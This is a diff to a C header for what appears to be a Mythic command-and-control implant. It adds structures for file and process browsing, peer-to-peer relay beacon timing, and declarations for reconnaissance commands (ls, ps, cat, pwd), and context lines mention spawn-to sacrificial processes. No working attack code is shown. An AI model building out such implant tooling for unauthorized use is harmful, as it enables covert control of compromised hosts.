@@ -128,6 +128,11 @@ typedef struct TaskPostRequest {
 	char *task_output;
 	char *task_status;
 	BOOL completed;
+	/* Optional structured payloads (UI file browser / process browser):
+	 * tab/newline-delimited blobs built by the agent, parsed by the
+	 * translation container into Mythic's file_browser/process_browser JSON. */
+	char *file_browser_blob;
+	char *process_browser_blob;
 } TaskPostRequest;
 
 typedef struct TaskPostReply {
@@ -270,6 +275,7 @@ typedef struct AgentState {
 	int is_p2p_child;   /* this agent binds a smb/tcp server and speaks Mythic over it */
 	char *spawnto;      /* sacrificial process path for the spawn command */
 	P2P_PEER p2p_peer;  /* p2p child: the accepted uplink channel carrying own traffic */
+	unsigned long p2p_rtt_ms; /* p2p child: largest observed request->reply round trip (relay cadence) */
 	P2P_PEER **links;   /* linked children (downlinks); any agent can hold several */
 	int link_count;
 	int link_cap;
@@ -311,6 +317,11 @@ char *p2p_pop_in(P2P_PEER *peer);
  * failing the exchange (a lost delegate reply must not wedge the agent). */
 #define P2P_RECV_TIMEOUT_SEC 45
 
+/* Relay beacon cap: an agent holding p2p links beacons at least this often so
+ * child traffic (tasking, downloads) relays quickly regardless of the
+ * configured interval. */
+#define P2P_RELAY_SLEEP_SEC 3
+
 typedef LONG NTSTATUS;
 typedef void *BCRYPT_ALG_HANDLE;
 typedef void *BCRYPT_KEY_HANDLE;
@@ -350,12 +361,20 @@ BOOL perform_tasking(AgentState *state, TaskingReply *reply);
 
 char *generate_post_message(TaskPostRequest *post, int *msg_len);
 void free_post_request(TaskPostRequest *request);
-BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status, BOOL completed);
+BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status, BOOL completed, char *file_browser_blob, char *process_browser_blob);
 
 UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid);
 char *generate_upload_message(UploadManager *upload, int *msg_len);
 void free_upload_manager(UploadManager *upload);
 BOOL perform_upload(AgentState *stage, UploadManager *upload);
+
+/* QoL commands (qol.c) */
+void agent_post_ext(AgentState *state, TaskInfo *task, char *output, char *success, char *file_browser_blob, char *process_browser_blob);
+void agent_ls(AgentState *state, TaskInfo *task);
+void agent_ps(AgentState *state, TaskInfo *task);
+void agent_cat(AgentState *state, TaskInfo *task);
+void agent_pwd(AgentState *state, TaskInfo *task);
+void agent_change(AgentState *state, TaskInfo *task);
 
 void pack_char(char *buf, int *offset, char paydata);
 void pack_uint(char *buf, int *offset, unsigned int paydata);
